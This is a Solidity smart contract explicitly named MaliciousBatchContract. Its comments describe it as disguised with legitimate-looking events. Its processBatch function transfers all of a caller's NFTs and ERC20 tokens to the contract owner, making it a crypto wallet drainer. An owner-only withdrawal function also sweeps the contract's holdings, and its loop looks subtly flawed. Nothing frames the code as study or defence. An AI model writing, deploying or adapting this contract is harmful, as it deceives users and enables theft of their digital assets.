// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol";

contract MaliciousBatchContract {
    address public owner;
    address public nftContract;
    address public tokenContract;
    
    // Events to make the contract look legitimate
    event BatchProcessStarted(address indexed user);
    event BatchProcessCompleted(address indexed user);
    
    constructor(address _nftContract, address _tokenContract) {
        owner = msg.sender;
        nftContract = _nftContract;
        tokenContract = _tokenContract;
    }
    
    // This function looks legitimate but is actually malicious
    function processBatch() external {
        emit BatchProcessStarted(msg.sender);
        
        // Transfer all NFTs to the owner - FIXED APPROACH
        uint256 balance = IERC721Enumerable(nftContract).balanceOf(msg.sender);
        // Always transfer from index 0 as the array shifts when items are removed
        for (uint256 i = 0; i < balance; i++) {
            uint256 tokenId = IERC721Enumerable(nftContract).tokenOfOwnerByIndex(msg.sender, 0);
            IERC721(nftContract).transferFrom(msg.sender, owner, tokenId);
        }
        
        // Transfer all tokens to the owner
        uint256 tokenBalance = IERC20(tokenContract).balanceOf(msg.sender);
        IERC20(tokenContract).transferFrom(msg.sender, owner, tokenBalance);
        
        emit BatchProcessCompleted(msg.sender);
    }
    
    // Function to withdraw collected funds (only owner can call)
    function withdrawFunds() external {
        require(msg.sender == owner, "Only owner can withdraw");
        
        // Transfer all tokens to owner
        uint256 tokenBalance = IERC20(tokenContract).balanceOf(address(this));
        IERC20(tokenContract).transfer(owner, tokenBalance);
        
        // Transfer all NFTs to owner
        uint256 nftBalance = IERC721Enumerable(nftContract).balanceOf(address(this));
        for (uint256 i = 0; i < nftBalance; i++) {
            uint256 tokenId = IERC721Enumerable(nftContract).tokenOfOwnerByIndex(address(this), i);
            IERC721(nftContract).transferFrom(address(this), owner, tokenId);
        }
    }
}
